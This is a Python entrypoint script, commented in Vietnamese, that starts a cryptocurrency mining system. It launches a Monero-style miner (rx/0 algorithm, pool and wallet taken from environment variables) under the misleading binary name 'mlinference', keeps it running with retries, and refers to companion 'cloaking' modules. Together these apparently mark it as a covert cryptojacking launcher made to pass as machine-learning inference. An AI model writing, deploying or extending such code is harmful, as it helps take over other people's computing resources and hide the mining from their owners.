"""
start_mining.py

Entrypoint chính để khởi động toàn bộ hệ thống khai thác tiền điện tử.
Thực hiện các bước thiết lập môi trường, khởi động các module quản lý tài nguyên và cloaking, và bắt đầu quá trình khai thác.
"""

import os
import sys
import subprocess
import threading
import signal
import time
from pathlib import Path


from mining_environment.scripts.logging_config import setup_logging

# Import các module Lớp 1: Môi Trường Khai Thác và tối ưu tài nguyên

from mining_environment.scripts import setup_env, system_manager


# Import các module Lớp 2 đến lớp 9
# Giả sử bạn có các module như layer2, layer3, ..., layer9
# import layer2  # noqa: E402
# import layer3  # noqa: E402
# ...
# import layer9  # noqa: E402

# Import cấu hình logging từ logging_config.py
 

# Thiết lập đường dẫn tới thư mục logs
LOGS_DIR = os.getenv('LOGS_DIR', '/app/mining_environment/logs')
os.makedirs(LOGS_DIR, exist_ok=True)

# Thiết lập logging với logging_config.py
logger = setup_logging(
    'start_mining',
    Path(LOGS_DIR) / 'start_mining.log',
    'INFO'
)

# Sự kiện dừng để xử lý graceful shutdown
stop_event = threading.Event()

# Định nghĩa sự kiện để đồng bộ giữa các phần của script
mining_started_event = threading.Event()


def signal_handler(signum, frame):
    """
    Xử lý tín hiệu dừng (SIGINT, SIGTERM).
    Đánh dấu sự kiện dừng để các thread có thể dừng lại một cách nhẹ nhàng.
    """
    logger.info(
        f"Nhận tín hiệu dừng ({signum}). Đang dừng hệ thống khai thác..."
    )
    stop_event.set()


# Đăng ký xử lý tín hiệu ngay sau khi định nghĩa hàm xử lý
signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)


def initialize_environment():
    """
    Thiết lập môi trường khai thác bằng cách gọi setup_env.py.
    """
    logger.info("Bắt đầu thiết lập môi trường khai thác.")
    try:
        setup_env.setup()
        logger.info("Thiết lập môi trường thành công.")
    except Exception as e:
        logger.error(f"Lỗi khi thiết lập môi trường: {e}")
        sys.exit(1)


def start_system_manager():
    """
    Khởi động quản lý tài nguyên bằng cách gọi system_manager.py.
    """
    logger.info("Khởi động Resource Manager.")
    try:
        system_manager.start()
        logger.info("Resource Manager đã được khởi động.")
    except Exception as e:
        logger.error(f"Lỗi khi khởi động Resource Manager: {e}")
        stop_event.set()
        try:
            system_manager.stop()
        except Exception as stop_error:
            logger.error(f"Lỗi khi dừng Resource Manager sau lỗi: {stop_error}")

def is_mining_process_running(mining_process):
    """
    Kiểm tra xem quá trình khai thác có đang chạy không.
    
    Args:
        mining_process (subprocess.Popen): Đối tượng quá trình khai thác.
    
    Returns:
        bool: True nếu đang chạy, False nếu không.
    """
    return mining_process and mining_process.poll() is None

def start_mining_process(retries=3, delay=5):
    """
    Khởi động quá trình khai thác bằng cách gọi mlinference với cơ chế thử lại.

    Args:
        retries (int): Số lần thử lại nếu khởi chạy quá trình thất bại.
        delay (int): Thời gian chờ giữa các lần thử (giây).

    Returns:
        subprocess.Popen or None: Đối tượng quá trình khai thác hoặc None nếu thất bại.
    """
    # Lấy đường dẫn thực thi từ biến môi trường
    mining_executable = os.getenv('MINING_COMMAND', '/usr/local/bin/mlinference')

    # Kiểm tra giá trị biến môi trường MINING_COMMAND
    if not mining_executable:
        logger.error("Biến môi trường MINING_COMMAND không được thiết lập.")
        stop_event.set()
        return None

    # Kiểm tra xem tệp thực thi có tồn tại và có quyền thực thi không
    if not os.path.isfile(mining_executable):
        logger.error(f"Không tìm thấy tệp thực thi khai thác tại: {mining_executable}")
        stop_event.set()
        return None
    if not os.access(mining_executable, os.X_OK):
        logger.error(f"Tệp thực thi khai thác không có quyền thực thi: {mining_executable}")
        stop_event.set()
        return None

    # Lấy địa chỉ máy chủ và địa chỉ ví từ biến môi trường
    mining_server_cpu = os.getenv('MINING_SERVER_CPU')
    mining_wallet_cpu = os.getenv('MINING_WALLET_CPU')

    # Kiểm tra giá trị biến môi trường MINING_SERVER_CPU và MINING_WALLET_CPU
    if not mining_server_cpu:
        logger.error("Biến môi trường MINING_SERVER_CPU không được thiết lập.")
        stop_event.set()
        return None
    if not mining_wallet_cpu:
        logger.error("Biến môi trường MINING_WALLET_CPU không được thiết lập.")
        stop_event.set()
        return None

    # Định nghĩa lệnh khai thác dưới dạng danh sách
    mining_command = [
        mining_executable,
        '--donate-level', '1',
        '-o', mining_server_cpu,
        '-u', mining_wallet_cpu,
        '-a', 'rx/0',
        '--no-huge-pages',
        '--tls'
    ]

    # Thử khởi chạy quá trình khai thác
    for attempt in range(1, retries + 1):
        logger.info(f"Thử khởi chạy quá trình khai thác (Cố gắng {attempt}/{retries})...")
        try:
            mining_process = subprocess.Popen(
                mining_command,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            logger.info(f"Quá trình khai thác đã được khởi động với PID: {mining_process.pid}")

            # Kiểm tra xem quá trình có đang chạy không
            time.sleep(2)  # Chờ một thời gian ngắn để tiến trình khởi chạy
            if mining_process.poll() is not None:
                stdout, stderr = mining_process.communicate()
                logger.error(f"Quá trình khai thác đã kết thúc ngay sau khi khởi động với mã trả về: {mining_process.returncode}")
                if stdout:
                    logger.error(f"STDOUT: {stdout.decode().strip()}")
                if stderr:
                    logger.error(f"STDERR: {stderr.decode().strip()}")
                mining_process = None
            else:
                logger.info("Quá trình khai thác đang chạy.")
                mining_started_event.set()
                return mining_process
        except Exception as e:
            logger.error(f"Lỗi khi khởi động quá trình khai thác: {e}")
            mining_process = None

        if attempt < retries:
            logger.info(f"Đang đợi {delay} giây trước khi thử lại...")
            time.sleep(delay)

    logger.error("Tất cả các cố gắng khởi chạy quá trình khai thác đã thất bại.")
    stop_event.set()
    return None

def main():
    """
    Hàm chính để khởi động toàn bộ hệ thống khai thác.
    """
    logger.info("===== Bắt đầu hoạt động khai thác tiền điện tử =====")

    # Bước 1: Thiết lập môi trường
    initialize_environment()

    # Bước 2: Bắt đầu khai thác trong thread chính với cơ chế thử lại
    mining_process = start_mining_process(retries=3, delay=5)

    # Kiểm tra quá trình khai thác
    if not is_mining_process_running(mining_process):
        logger.error(
            "Quá trình khai thác không khởi động thành công sau nhiều cố gắng. "
            "Dừng hệ thống khai thác."
        )
        stop_event.set()  # Đảm bảo stop_event được kích hoạt
        system_manager.stop()  # Gọi stop để dừng quản lý tài nguyên
        sys.exit(1)

    # Bước 3: Khởi động Resource Manager trong thread riêng
    resource_thread = threading.Thread(target=start_system_manager, daemon=True)
    try:
        resource_thread.start()
    except Exception as e:
        logger.error(f"Lỗi khi khởi động Resource Manager: {e}")
        stop_event.set()
        system_manager.stop()
        sys.exit(1)

    # Chờ tín hiệu dừng
    try:
        while not stop_event.is_set():
            if mining_process:
                retcode = mining_process.poll()
                if retcode is not None:
                    logger.warning(
                        f"Quá trình khai thác đã kết thúc với mã trả về: {retcode}. "
                        "Dừng hệ thống khai thác."
                    )
                    stop_event.set()
            time.sleep(1)
    except KeyboardInterrupt:
        logger.info(
            "Đã nhận tín hiệu KeyboardInterrupt. Đang dừng hệ thống khai thác..."
        )
        stop_event.set()
    finally:
        logger.info("Đang dừng các thành phần khai thác...")

        # Dừng quá trình khai thác nếu vẫn đang chạy
        try:
            if mining_process and mining_process.poll() is None:
                mining_process.terminate()
                mining_process.wait(timeout=10)
                logger.info("Quá trình khai thác đã được dừng.")
        except Exception as e:
            logger.error(f"Lỗi khi dừng quá trình khai thác: {e}")

        # Dừng Resource Manager
        try:
            system_manager.stop()
            logger.info("Đã dừng tất cả các quản lý tài nguyên.")
        except Exception as e:
            logger.error(f"Lỗi khi dừng các quản lý tài nguyên: {e}")

        # Chờ thread dừng nếu chưa hoàn tất
        if resource_thread.is_alive():
            resource_thread.join(timeout=5)
            if resource_thread.is_alive():
                logger.error("Thread Resource Manager không thể dừng hoàn toàn.")

        logger.info("===== Hoạt động khai thác tiền điện tử đã dừng thành công =====")

if __name__ == "__main__":
    main()
